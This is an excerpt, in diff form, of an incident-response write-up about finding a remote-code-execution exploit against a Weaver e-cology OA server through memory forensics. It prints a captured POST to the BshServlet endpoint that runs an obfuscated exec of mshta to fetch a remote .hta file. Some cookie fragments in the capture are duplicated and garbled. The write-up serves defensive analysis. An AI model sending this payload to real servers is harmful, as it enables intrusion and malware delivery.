@@ -1,0 +1,15 @@
+
+This lined up with our HTTP log analysis, yet we didn't have the payload.
+String it to Weaver Anybody who's worked in incident response long enough knows that when parsing the data has failed to uncover the evidence you're looking for, the last thing you can try is sifting through the raw bytes and strings of a file.
+Volatility has a handy feature to map the string offset to the corresponding process and virtual address.
+Once this is complete grep searching for specific keywords and filtering through the strings identified a number of HTTP POST requests sitting in unallocated space, expanding our grep using it's context parameter uncovered interesting HTTP POST requests and their payload.
+Example POST payload: POST /weaver/bsh.servlet.
+BshServlet/ HTTP/1.1 Host: x.x.x.x:88 Connection: close Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept-Language: en-US,en;q=0.5 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 134 bsh.script=eval .(\"ex\"+\"ec(\\\"mshta
+ hxxp:// www[DOMAIN]/index[.]hta\\\")\");&bsh.servlet.output=raw23; languageidweaver=7; testBanCookie=test; JSESSIONID=xxxxxxxxxx; Systemlanguid=7 tBanCookie=test; Systemlanguid=7; loginidweaver=
+xxx
+st; Systemlanguid=7; loginidweaver=
+xxx We knew this was the exploit we were looking for.
+The payload was exactly what the attacker was executing and the URI confirmed the process path we had identified from the memory image.
+It was making a request to BshServlet .
+It was unclear if this vulnerability was known, as there was no CVE associated with the software.
+ Open source research identified a number of Chinese blog sites discussing a newly identified RCE vulnerability with Weaver e-cology OA system.
